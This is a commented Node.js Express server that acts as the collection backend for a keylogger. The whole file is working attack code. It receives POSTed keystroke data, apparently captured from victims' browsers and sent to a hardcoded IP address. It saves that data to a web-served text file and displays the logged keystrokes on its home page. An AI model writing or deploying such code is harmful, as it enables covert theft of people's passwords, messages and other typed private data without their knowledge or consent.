// We import the fs module so that we can have access to the file system.
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// This create the express app.
const app = express();

// The app should utilize bodyParser. For this example, we'll utilize json. bodyParser gives you access to the body of your request.
app.use(bodyParser.json({extended: true}));

// We assign the port number 80.
const port = 80;

// Add Access Control Allow Origin headers
app.use((req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "http://4.240.89.228/");
    res.header(
      "Access-Control-Allow-Headers",
      "Origin, X-Requested-With, Content-Type, Accept"
    );
    next();
  });

// When we receive a GET request for the "/" resource, we return simple HTML.
app.get("/", (req, res) => {
    try {
        const kl_file = fs.readFileSync("/var/www/html/keylog.txt", {encoding:'utf8', flag:'r'});    

        // We transfer the data from the txt file to the server. We substitute "n" with br>.
        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>Nothing logged yet.</h1>");
    }  
});


app.post("/", (req, res) => {

    // We log the keyboardData sent as part of the body of the POST request to the server.
    console.log(req.body.keyboardData);

    // We can now write the keyboard capture to a text file.
    fs.writeFileSync("/var/www/html/keylog.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});
// We check if the app is listening on which port.
app.listen(port, () => {
    console.log(`Key Logger is listening on port ${port}`);
});
